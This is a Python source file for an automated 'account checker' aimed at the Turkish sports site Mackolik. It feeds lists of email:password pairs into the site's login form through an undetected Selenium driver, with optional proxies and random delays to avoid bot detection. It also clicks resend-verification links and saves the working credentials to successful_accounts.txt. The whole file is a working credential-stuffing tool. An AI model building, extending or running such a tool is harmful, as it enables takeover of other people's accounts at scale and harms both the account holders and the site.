"""
Modern account checker for Mackolik accounts
"""
import time
from typing import List, Tuple, Optional
from pathlib import Path
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from loguru import logger
from utils import validate_email_password_format
from selenium_manager import SeleniumManager

class AccountChecker:
    """Modern account checker for Mackolik accounts"""
    
    def __init__(self, proxy: Optional[str] = None):
        self.selenium_manager = SeleniumManager(proxy=proxy)
        
    def check_account(self, email: str, password: str) -> Tuple[bool, str, str]:
        """
        Check if account credentials are valid
        
        Args:
            email: Email address
            password: Password
            
        Returns:
            Tuple[bool, str, str]: (is_valid, status, message)
        """
        try:
            with self.selenium_manager.get_driver(use_undetected=True) as driver:
                logger.info(f"Checking account: {email}")
                
                # Step 1: Open Mackolik website
                if not self._open_mackolik_website(driver):
                    return False, "error", "Failed to open Mackolik website"
                
                # Step 2: Handle advertisement
                self._handle_advertisement(driver)
                
                # Step 3: Attempt login
                login_result = self._attempt_login(driver, email, password)
                
                if login_result[0]:  # Login successful
                    return True, "success", "Login successful"
                else:
                    return False, login_result[1], login_result[2]
                    
        except Exception as e:
            logger.error(f"Error checking account {email}: {e}")
            return False, "error", f"Error: {str(e)}"
    
    def _open_mackolik_website(self, driver) -> bool:
        """Open Mackolik website"""
        try:
            driver.get("https://www.mackolik.com/canli-sonuclar")
            self.selenium_manager.random_delay(2, 4)
            return True
        except Exception as e:
            logger.error(f"Failed to open Mackolik website: {e}")
            return False
    
    def _handle_advertisement(self, driver):
        """Handle advertisement popup"""
        try:
            ad_button = driver.find_element(By.ID, 'percent')
            if ad_button:
                self.selenium_manager.safe_click(driver, ad_button)
                logger.info("Advertisement skipped")
                self.selenium_manager.random_delay(1, 2)
        except NoSuchElementException:
            logger.debug("No advertisement found")
        except Exception as e:
            logger.warning(f"Error handling advertisement: {e}")
    
    def _attempt_login(self, driver, email: str, password: str) -> Tuple[bool, str, str]:
        """Attempt to login with credentials"""
        try:
            # Click login widget
            login_widget = self.selenium_manager.wait_for_clickable(
                driver, By.CSS_SELECTOR, 
                'div.widget-login[data-module="login"][data-module-loaded="true"]'
            )
            self.selenium_manager.safe_click(driver, login_widget)
            self.selenium_manager.random_delay(1, 2)
            
            # Fill email
            email_field = driver.find_element(By.ID, 'login-email')
            self.selenium_manager.safe_send_keys(email_field, email)
            self.selenium_manager.random_delay(0.5, 1)
            
            # Fill password
            password_field = driver.find_element(By.ID, 'login-password')
            self.selenium_manager.safe_send_keys(password_field, password)
            self.selenium_manager.random_delay(0.5, 1)
            
            # Click login button
            login_button = driver.find_element(By.ID, 'btn-login')
            self.selenium_manager.safe_click(driver, login_button)
            self.selenium_manager.random_delay(2, 3)
            
            # Check for error messages
            error_result = self._check_for_errors(driver, email)
            if error_result[0]:  # Error found
                return False, error_result[1], error_result[2]
            
            # Check login status
            login_status = self._check_login_status(driver)
            if login_status[0]:  # Login successful
                return True, "success", "Login successful"
            else:
                return False, "failed", "Login failed - unknown reason"
                
        except Exception as e:
            logger.error(f"Error during login attempt: {e}")
            return False, "error", f"Login error: {str(e)}"
    
    def _check_for_errors(self, driver, email: str) -> Tuple[bool, str, str]:
        """Check for error messages after login attempt"""
        try:
            # Look for error message
            error_message_element = driver.find_element(By.CSS_SELECTOR, 'div.message')
            error_text = error_message_element.text.strip()
            
            if error_text:
                if "Eposta adresinizi onaylamanız gerekmektedir." in error_text:
                    # Try to resend verification
                    self._try_resend_verification(driver, email)
                    return True, "email_verification", "Email verification required"
                else:
                    return True, "login_failed", f"Login failed: {error_text}"
            
            return False, "", ""
            
        except NoSuchElementException:
            # No error message found
            return False, "", ""
        except Exception as e:
            logger.warning(f"Error checking for error messages: {e}")
            return False, "", ""
    
    def _try_resend_verification(self, driver, email: str):
        """Try to resend verification email"""
        try:
            resend_link = driver.find_element(By.CSS_SELECTOR, 'span.resend-verification')
            self.selenium_manager.safe_click(driver, resend_link)
            logger.info(f"Verification email resent for: {email}")
        except NoSuchElementException:
            logger.debug("Resend verification link not found")
        except Exception as e:
            logger.warning(f"Error resending verification: {e}")
    
    def _check_login_status(self, driver) -> Tuple[bool, str]:
        """Check if login was successful"""
        try:
            login_widget = driver.find_element(
                By.CSS_SELECTOR, 
                'div.widget-login[data-module="login"][data-module-loaded="true"]'
            )
            
            # Check if widget shows logged in state
            if "widget-login--logged-in" in login_widget.get_attribute("class"):
                return True, "Login successful"
            else:
                return False, "Login failed"
                
        except Exception as e:
            logger.error(f"Error checking login status: {e}")
            return False, f"Error: {str(e)}"
    
    def check_multiple_accounts(
        self, 
        account_list: List[str], 
        progress_callback: Optional[callable] = None
    ) -> Tuple[int, int, int, int]:
        """
        Check multiple accounts
        
        Args:
            account_list: List of email:password strings
            progress_callback: Callback function for progress updates
            
        Returns:
            Tuple[int, int, int, int]: (successful, failed, email_verification, error)
        """
        successful = 0
        failed = 0
        email_verification = 0
        error = 0
        
        for i, account_line in enumerate(account_list):
            try:
                email, password = validate_email_password_format(account_line)
                if not email or not password:
                    logger.warning(f"Invalid format: {account_line}")
                    error += 1
                    continue
                
                logger.info(f"Checking account {i+1}/{len(account_list)}: {email}")
                
                is_valid, status, message = self.check_account(email, password)
                
                if is_valid:
                    successful += 1
                    self._save_result(email, password, "success", message)
                    logger.info(f"✓ Account valid: {email}")
                else:
                    if status == "email_verification":
                        email_verification += 1
                        self._save_result(email, password, "email_verification", message)
                        logger.warning(f"⚠ Email verification required: {email}")
                    elif status == "login_failed":
                        failed += 1
                        self._save_result(email, password, "failed", message)
                        logger.error(f"✗ Login failed: {email}")
                    else:
                        error += 1
                        self._save_result(email, password, "error", message)
                        logger.error(f"✗ Error: {email} - {message}")
                
                # Progress callback
                if progress_callback:
                    progress_callback(i + 1, len(account_list), email, is_valid)
                
                # Delay between checks
                if i < len(account_list) - 1:
                    self.selenium_manager.random_delay(2, 4)
                    
            except Exception as e:
                error += 1
                logger.error(f"Error processing account {account_line}: {e}")
                self._save_result("", "", "error", str(e))
        
        logger.info(f"Account checking completed: {successful} successful, {failed} failed, {email_verification} email verification, {error} errors")
        return successful, failed, email_verification, error
    
    def _save_result(self, email: str, password: str, status: str, message: str):
        """Save account check result to appropriate file"""
        try:
            if not email or not password:
                return
                
            account_data = f"{email}:{password}"
            
            if status == "success":
                filename = "successful_accounts.txt"
            elif status == "email_verification":
                filename = "email_verification_required.txt"
            elif status == "failed":
                filename = "failed_accounts.txt"
            else:
                filename = "error_accounts.txt"
            
            with open(filename, "a", encoding="utf-8") as file:
                if status == "error":
                    file.write(f"{message}\n")
                else:
                    file.write(f"{account_data}: - {message}\n")
                    
        except Exception as e:
            logger.error(f"Failed to save result: {e}")